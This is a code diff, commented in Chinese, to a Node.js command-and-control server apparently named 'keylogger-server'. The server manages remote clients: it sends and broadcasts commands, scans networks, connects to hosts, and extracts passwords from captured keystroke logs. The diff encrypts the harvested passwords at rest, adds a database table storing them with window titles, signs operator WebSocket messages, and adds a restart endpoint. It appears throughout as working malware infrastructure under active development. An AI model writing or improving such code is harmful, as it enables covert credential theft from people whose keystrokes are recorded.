@@ -15,6 +15,7 @@ const winston = require('winston');
 const DailyRotateFile = require('winston-daily-rotate-file');
 const open = require('open');
 const crypto = require('crypto');
+const { execFile } = require('child_process');
 const { LRUCache } = require('lru-cache');
 const rateLimit = require('express-rate-limit');
 
@@ -132,6 +133,84 @@ function verifyAuthToken(token) {
         return false;
     }
     return Date.now() <= Number(expires);
+}
+
+const SENSITIVE_DATA_KEY = crypto.createHash('sha256')
+    .update(process.env.SENSITIVE_DATA_KEY || AUTH_CONFIG.secret)
+    .digest();
+
+function encryptSensitiveData(plainText) {
+    const iv = crypto.randomBytes(12);
+    const cipher = crypto.createCipheriv('aes-256-gcm', SENSITIVE_DATA_KEY, iv);
+    const ciphertext = Buffer.concat([cipher.update(Buffer.from(plainText, 'utf8')), cipher.final()]);
+    const authTag = cipher.getAuthTag();
+    return `${iv.toString('base64')}.${authTag.toString('base64')}.${ciphertext.toString('base64')}`;
+}
+
+function decryptSensitiveData(payload) {
+    if (!payload || typeof payload !== 'string') return '';
+    const parts = payload.split('.');
+    if (parts.length !== 3) throw new Error('无效的加密数据格式');
+    const iv = Buffer.from(parts[0], 'base64');
+    const authTag = Buffer.from(parts[1], 'base64');
+    const ciphertext = Buffer.from(parts[2], 'base64');
+    const decipher = crypto.createDecipheriv('aes-256-gcm', SENSITIVE_DATA_KEY, iv);
+    decipher.setAuthTag(authTag);
+    return Buffer.concat([decipher.update(ciphertext), decipher.final()]).toString('utf8');
+}
+
+async function readSensitiveFile(filePath) {
+    try {
+        const content = await fs.promises.readFile(filePath, 'utf8');
+        try {
+            return decryptSensitiveData(content);
+        } catch (e) {
+            return content;
+        }
+    } catch (err) {
+        if (err.code === 'ENOENT') return '';
+        throw err;
+    }
+}
+
+async function writeEncryptedFile(filePath, plainText) {
+    const payload = encryptSensitiveData(plainText || '');
+    await fs.promises.mkdir(path.dirname(filePath), { recursive: true });
+    await fs.promises.writeFile(filePath, payload, 'utf8');
+    await fs.promises.chmod(filePath, 0o600).catch(() => {});
+}
+
+async function appendEncryptedFile(filePath, block) {
+    const existing = await readSensitiveFile(filePath);
+    await writeEncryptedFile(filePath, `${existing}${block}`);
+}
+
+const WS_MESSAGE_TTL = 10 * 1000;
+function createWsMessageToken() {
+    const expires = Date.now() + WS_MESSAGE_TTL;
+    const payload = `${expires}`;
+    const signature = crypto.createHmac('sha256', AUTH_CONFIG.secret).update(payload).digest('hex');
+    return `${payload}.${signature}`;
+}
+
+function verifyWsMessageToken(token) {
+    if (!token) return false;
+    const [expires, signature] = token.split('.');
+    if (!expires || !signature) return false;
+    const expected = crypto.createHmac('sha256', AUTH_CONFIG.secret).update(expires).digest('hex');
+    try {
+        if (!crypto.timingSafeEqual(Buffer.from(signature, 'utf8'), Buffer.from(expected, 'utf8'))) {
+            return false;
+        }
+    } catch (e) {
+        return false;
+    }
+    return Date.now() <= Number(expires);
+}
+
+function sendWebSocketJson(ws, payload) {
+    payload.authToken = createWsMessageToken();
+    ws.send(JSON.stringify(payload));
 }
 
 // ========== 配置常量 ==========
@@ -832,6 +911,19 @@ async function initDatabase() {
                 updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
             ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci
         `);
+
+        await executeWithRetry(`
+            CREATE TABLE IF NOT EXISTS sensitive_passwords (
+                id BIGINT UNSIGNED AUTO_INCREMENT PRIMARY KEY,
+                source_file VARCHAR(255) NOT NULL,
+                window_title VARCHAR(255),
+                timestamp VARCHAR(64),
+                password_enc TEXT NOT NULL,
+                raw_password_enc TEXT NOT NULL,
+                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+            ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci
+        `);
+
         const [indexExists] = await executeWithRetry(
             `SELECT 1 FROM INFORMATION_SCHEMA.STATISTICS 
              WHERE table_schema = DATABASE() 
@@ -1327,10 +1419,10 @@ class ClientManager {
 
     addWebClient(ws) {
         this.webClients.add(ws);
-        ws.send(JSON.stringify({
+        sendWebSocketJson(ws, {
             type: 'clients_list',
             clients: this.getAllClients()
-        }));
+        });
     }
 
     removeWebClient(ws) {
@@ -1938,19 +2030,26 @@ function handleWebSocketConnection(ws, req) {
 
     logger.info('Web 客户端已连接');
     clientManager.addWebClient(ws);
+    sendWebSocketJson(ws, { type: 'ws_connected' });
 
     ws.on('message', async (message) => {
         try {
             const data = JSON.parse(message);
+            if (!verifyWsMessageToken(data.authToken)) {
+                logger.warn('拒绝未授权的 WebSocket 消息');
+                ws.close(1008, 'Unauthorized');
+                return;
+            }
+
             switch (data.type) {
                 case 'command':
                     const result = await clientManager.sendCommand(data.clientId, data.command);
-                    ws.send(JSON.stringify({ type: 'command_result', result }));
+                    sendWebSocketJson(ws, { type: 'command_result', result });
                     break;
 
                 case 'broadcast_command':
                     const results = await clientManager.broadcastCommand(data.command, data.tag);
-                    ws.send(JSON.stringify({ type: 'broadcast_result', results }));
+                    sendWebSocketJson(ws, { type: 'broadcast_result', results });
                     break;
 
                 case 'scan_network':
@@ -1960,9 +2059,9 @@ function handleWebSocketConnection(ws, req) {
                             data.endIp,
                             data.ports || CONFIG.scanPorts
                         );
-                        ws.send(JSON.stringify({ type: 'scan_complete', found }));
+                        sendWebSocketJson(ws, { type: 'scan_complete', found });
                     } catch (e) {
-                        ws.send(JSON.stringify({ type: 'scan_error', message: e.message }));
+                        sendWebSocketJson(ws, { type: 'scan_error', message: e.message });
                     }
                     break;
 
@@ -1970,15 +2069,15 @@ function handleWebSocketConnection(ws, req) {
                     try {
                         const client = await clientManager.manualConnect(data.ip, data.port);
                         if (client) {
-                            ws.send(JSON.stringify({ type: 'connect_result', client }));
+                            sendWebSocketJson(ws, { type: 'connect_result', client });
                         } else {
-                            ws.send(JSON.stringify({ 
-                                type: 'connect_error', 
-                                message: `无法连接到 ${data.ip}:${data.port}，请检查目标主机是否在线且端口可访问` 
-                            }));
+                            sendWebSocketJson(ws, {
+                                type: 'connect_error',
+                                message: `无法连接到 ${data.ip}:${data.port}，请检查目标主机是否在线且端口可访问`
+                            });
                         }
                     } catch (e) {
-                        ws.send(JSON.stringify({ type: 'connect_error', message: e.message }));
+                        sendWebSocketJson(ws, { type: 'connect_error', message: e.message });
                     }
                     break;
 
@@ -1988,24 +2087,24 @@ function handleWebSocketConnection(ws, req) {
                         client.socket.end();
                         clientManager.clients.delete(data.clientId);
                     }
-                    ws.send(JSON.stringify({ type: 'disconnected', clientId: data.clientId }));
+                    sendWebSocketJson(ws, { type: 'disconnected', clientId: data.clientId });
                     break;
 
                 case 'subscribe_console':
                     if (data.clientId) {
                         clientManager.subscribeConsole(ws, data.clientId);
-                        ws.send(JSON.stringify({ type: 'subscribe_console_result', success: true, clientId: data.clientId }));
+                        sendWebSocketJson(ws, { type: 'subscribe_console_result', success: true, clientId: data.clientId });
                     } else {
-                        ws.send(JSON.stringify({ type: 'subscribe_console_result', success: false, error: 'clientId 不能为空' }));
+                        sendWebSocketJson(ws, { type: 'subscribe_console_result', success: false, error: 'clientId 不能为空' });
                     }
                     break;
 
                 case 'unsubscribe_console':
                     if (data.clientId) {
                         clientManager.unsubscribeConsole(ws, data.clientId);
-                        ws.send(JSON.stringify({ type: 'unsubscribe_console_result', success: true, clientId: data.clientId }));
+                        sendWebSocketJson(ws, { type: 'unsubscribe_console_result', success: true, clientId: data.clientId });
                     } else {
-                        ws.send(JSON.stringify({ type: 'unsubscribe_console_result', success: false, error: 'clientId 不能为空' }));
+                        sendWebSocketJson(ws, { type: 'unsubscribe_console_result', success: false, error: 'clientId 不能为空' });
                     }
                     break;
 
@@ -2018,18 +2117,18 @@ function handleWebSocketConnection(ws, req) {
                             client: { id: data.clientId }
                         });
 
-                        ws.send(JSON.stringify({
+                        sendWebSocketJson(ws, {
                             type: 'delete_result',
                             success: true,
                             clientId: data.clientId
-                        }));
+                        });
                     } catch (e) {
-                        ws.send(JSON.stringify({
+                        sendWebSocketJson(ws, {
                             type: 'delete_result',
                             success: false,
                             clientId: data.clientId,
                             error: e.message
-                        }));
+                        });
                     }
                     break;
 
@@ -2037,12 +2136,12 @@ function handleWebSocketConnection(ws, req) {
                     try {
                         const status = await clientManager.getClientStatus(data.ip);
                         if (status.success) {
-                            ws.send(JSON.stringify({ type: 'client_status_result', ...status }));
+                            sendWebSocketJson(ws, { type: 'client_status_result', ...status });
                         } else {
-                            ws.send(JSON.stringify({ type: 'client_status_error', message: status.error }));
+                            sendWebSocketJson(ws, { type: 'client_status_error', message: status.error });
                         }
                     } catch (e) {
-                        ws.send(JSON.stringify({ type: 'client_status_error', message: e.message }));
+                        sendWebSocketJson(ws, { type: 'client_status_error', message: e.message });
                     }
                     break;
 
@@ -2050,20 +2149,20 @@ function handleWebSocketConnection(ws, req) {
                     try {
                         const result = await clientManager.triggerClientUpdate(data.ip);
                         if (result.success) {
-                            ws.send(JSON.stringify({ type: 'update_result', ...result }));
+                            sendWebSocketJson(ws, { type: 'update_result', ...result });
                         } else {
-                            ws.send(JSON.stringify({ type: 'update_error', message: result.error }));
+                            sendWebSocketJson(ws, { type: 'update_error', message: result.error });
                         }
                     } catch (e) {
-                        ws.send(JSON.stringify({ type: 'update_error', message: e.message }));
+                        sendWebSocketJson(ws, { type: 'update_error', message: e.message });
                     }
                     break;
 
                 default:
-                    ws.send(JSON.stringify({ type: 'error', message: '未知的命令类型' }));
+                    sendWebSocketJson(ws, { type: 'error', message: '未知的命令类型' });
             }
         } catch (e) {
-            ws.send(JSON.stringify({ type: 'error', message: e.message }));
+            sendWebSocketJson(ws, { type: 'error', message: e.message });
         }
     });
 
@@ -2141,17 +2240,17 @@ async function cleanSelectedLogs(filenames) {
 
                 const dir = path.dirname(CONFIG.sensitiveLogSavePath);
                 if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
-                await fs.promises.appendFile(CONFIG.sensitiveLogSavePath, block, 'utf8');
+                await appendEncryptedFile(CONFIG.sensitiveLogSavePath, block);
                 totalSaved += extractedPasswords.length;
             }
 
-            // 4. 删除源文件
+            // 4. 删除文件
             await alistClient.deleteFile(filePath);
-            totalClean++;
-            results.push({ filename, success: true });
-        } catch (err) {
-            logger.error(`[清理选中] 处理 ${filename} 失败: ${err.message}`);
-            results.push({ filename, success: false, error: err.message });
+            totalClean += 1;
+            results.push({ filename, status: 'success', saved: extractedPasswords.length });
+        } catch (error) {
+            logger.error(`[清理选中] 处理文件 ${filename} 失败: ${error.message}`);
+            results.push({ filename, status: 'error', error: error.message });
         }
     }
 
@@ -3123,10 +3222,7 @@ app.post('/api/extract-passwords', asyncHandler(async (req, res) => {
         let extraPasswords = [];
         try {
             if (fs.existsSync(CONFIG.sensitiveLogSavePath)) {
-                const saveContent = await fs.promises.readFile(
-                    CONFIG.sensitiveLogSavePath,
-                    'utf8'
-                );
+                const saveContent = await readSensitiveFile(CONFIG.sensitiveLogSavePath);
                 extraPasswords = parseSensitiveSaves(saveContent);
                 logger.debug(`从敏感保存文件中解析到 ${extraPasswords.length} 条密码`);
             }
@@ -3164,8 +3260,16 @@ app.post('/api/extract-passwords', asyncHandler(async (req, res) => {
 
         const logsDir = path.join(__dirname, 'logs');
         if (!fs.existsSync(logsDir)) fs.mkdirSync(logsDir, { recursive: true });
-        await fs.promises.writeFile(path.join(logsDir, resultFilename), resultContent);
+        await writeEncryptedFile(path.join(logsDir, resultFilename), resultContent);
         logger.info(`成功保存提取结果到: ${resultFilename}, 密码数量: ${uniquePasswords.length}`);
+
+        if (uniquePasswords.length > 0) {
+            const insertPromises = uniquePasswords.map(item => executeWithRetry(
+                'INSERT INTO sensitive_passwords (source_file, window_title, timestamp, password_enc, raw_password_enc) VALUES (?, ?, ?, ?, ?)',
+                [item.file, item.window || null, item.timestamp || null, encryptSensitiveData(item.password), encryptSensitiveData(item.rawPassword || '')]
+            ));
+            await Promise.all(insertPromises);
+        }
 
         // 更新缓存
         extractionCache.lastExtractTime = Date.now();
@@ -3255,6 +3359,26 @@ app.post('/api/maintenance/clean-expired-logs', asyncHandler(async (req, res) =>
     }
 }));
 
+app.get('/api/test', (req, res) => res.json({ ok: true }));
+app.post('/api/system/restart', asyncHandler(async (req, res) => {
+    const processName = 'keylogger-server';
+    
+    // 立即返回成功响应，避免连接被重启中断
+    res.json({ success: true, message: `正在后台重启服务: ${processName}` });
+    
+    // 延迟500ms执行重启命令，确保响应已发送到客户端
+    setTimeout(() => {
+        const { exec } = require('child_process');
+        exec(`pm2 restart ${processName}`, { windowsHide: true }, (error, stdout, stderr) => {
+            if (error) {
+                logger.error(`服务重启失败: ${stderr || error.message}`);
+            } else {
+                logger.info(`服务重启命令已执行: ${stdout}`);
+            }
+        });
+    }, 500);
+}));
+
 app.get('/api/blacklist', asyncHandler(async (req, res) => {
     const page = Math.max(1, parseInt(req.query.page, 10) || 1);
     const limit = Math.min(100, Math.max(5, parseInt(req.query.limit, 10) || 20));
@@ -3334,12 +3458,15 @@ app.delete('/api/blacklist/:id', asyncHandler(async (req, res) => {
 app.get('/api/extract-passwords/view', asyncHandler(async (req, res) => {
     const filePath = path.join(__dirname, 'logs', 'extracted_passwords.txt');
     try {
-        await fs.promises.access(filePath, fs.constants.R_OK);
+        const content = await readSensitiveFile(filePath);
+        if (!content) {
+            return res.status(404).send('提取结果文件不存在');
+        }
+        res.type('text/plain').send(content);
     } catch (e) {
-        return res.status(404).send('提取结果文件不存在');
+        logger.warn('读取提取结果文件失败', { error: e.message });
+        res.status(500).send('读取结果文件失败');
     }
-    const content = await fs.promises.readFile(filePath, 'utf8');
-    res.type('text/plain').send(content);
 }));
 
 // ========== 全局错误处理 ==========
